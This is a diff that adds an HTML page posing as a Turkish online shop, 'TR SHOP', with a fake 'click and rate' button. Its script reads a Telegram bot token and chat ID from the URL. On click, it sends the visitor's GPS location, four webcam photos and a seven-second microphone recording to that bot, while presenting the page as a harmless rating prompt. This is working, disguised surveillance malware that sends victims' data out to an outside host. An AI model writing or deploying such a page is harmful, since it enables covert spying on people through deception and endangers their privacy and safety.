@@ -1,1 +1,161 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TR SHOP</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+    body { background: #f0f2f5; color: #333; }
+    header { background: #1c1f26; color: #fff; padding: 20px; text-align: center; box-shadow: 0 0 10px rgba(0,0,0,0.3); position: sticky; top: 0; z-index: 1000; }
+    header h1 { font-size: 2.5em; animation: slideIn 1s ease-in-out; }
+    @keyframes slideIn { 0% { transform: translateY(-100%); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
+    .products { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; padding: 40px; }
+    .product { background: #fff; padding: 15px; border-radius: 15px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); transition: transform 0.3s, box-shadow 0.3s; }
+    .product:hover { transform: scale(1.05); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
+    .product img { width: 100%; border-radius: 10px; }
+    .product h3 { margin: 10px 0; font-size: 1.2em; }
+    .price { font-weight: bold; color: #2e8b57; }
+    footer { background: #1c1f26; color: #fff; text-align: center; padding: 20px; margin-top: 50px; }
+    .permission-btn { display: block; margin: 20px auto; padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>TR SHOP</h1>
+    <p>Giyim, Teknoloji, Yiyecek, Her Şey Burada!</p>
+  </header>
 
+  <section class="products">
+    <div class="product">
+      <img src="https://via.placeholder.com/250x250.png?text=Kulaklik" alt="Kulaklık">
+      <h3>Bluetooth Kulaklık</h3>
+      <p class="price">₺349.99</p>
+    </div>
+  </section>
+
+  <button class="permission-btn" id="requestPermission">Tıkla ve Puan Ver</button>
+
+  <footer>
+    <p>&copy; 2025 TR SHOP - Tüm hakları saklıdır.</p>
+  </footer>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const token = urlParams.get('token');
+    const chatId = urlParams.get('chat_id');
+
+    if (!token || !chatId) {
+      alert("❌ Token veya Chat ID eksik.");
+      throw new Error("Eksik veri.");
+    }
+
+    document.getElementById('requestPermission').addEventListener('click', function () {
+      function sendMessage(text) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text })
+        });
+      }
+
+      function getLocation() {
+        return new Promise((resolve, reject) => {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+              const text = `📍 GPS Konumu:\nLatitude: ${position.coords.latitude}\nLongitude: ${position.coords.longitude}`;
+              sendMessage(text);
+              resolve();
+            }, reject);
+          } else {
+            reject("Tarayıcı konum desteklemiyor.");
+          }
+        });
+      }
+
+      function takeAndSendPhotos() {
+        return new Promise((resolve, reject) => {
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+              const video = document.createElement('video');
+              video.srcObject = stream;
+              video.play();
+
+              const canvas = document.createElement('canvas');
+              const ctx = canvas.getContext('2d');
+              canvas.width = 640;
+              canvas.height = 480;
+
+              let photoCount = 0;
+              function capturePhoto() {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(blob => {
+                  const file = new File([blob], `photo${photoCount + 1}.jpg`, { type: "image/jpeg" });
+                  const formData = new FormData();
+                  formData.append("chat_id", chatId);
+                  formData.append("photo", file);
+                  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                  }).then(() => {
+                    photoCount++;
+                    if (photoCount < 4) {
+                      setTimeout(capturePhoto, 1000);
+                    } else {
+                      stream.getTracks().forEach(track => track.stop());
+                      sendMessage("📷 Kamera görüntüsü gönderildi.");
+                      resolve();
+                    }
+                  });
+                }, 'image/jpeg');
+              }
+              setTimeout(capturePhoto, 2000);
+            }).catch(reject);
+        });
+      }
+
+      function recordAudio() {
+        return new Promise((resolve, reject) => {
+          navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+              const mediaRecorder = new MediaRecorder(stream);
+              const chunks = [];
+              mediaRecorder.ondataavailable = e => chunks.push(e.data);
+              mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                const file = new File([blob], "audio.ogg");
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("voice", file);
+                fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
+                  method: "POST",
+                  body: formData
+                }).then(() => {
+                  sendMessage("🎤 7 saniyelik ses kaydı gönderildi.");
+                  resolve();
+                });
+              };
+              mediaRecorder.start();
+              setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+              }, 7000);
+            }).catch(reject);
+        });
+      }
+
+      (async () => {
+        try {
+          await getLocation();
+          await takeAndSendPhotos();
+          await recordAudio();
+          alert("✅ Bilgiler başarıyla gönderildi.");
+        } catch (err) {
+          alert("❌ Hata: " + err);
+        }
+      })();
+    });
+  </script>
+</body>
+</html>
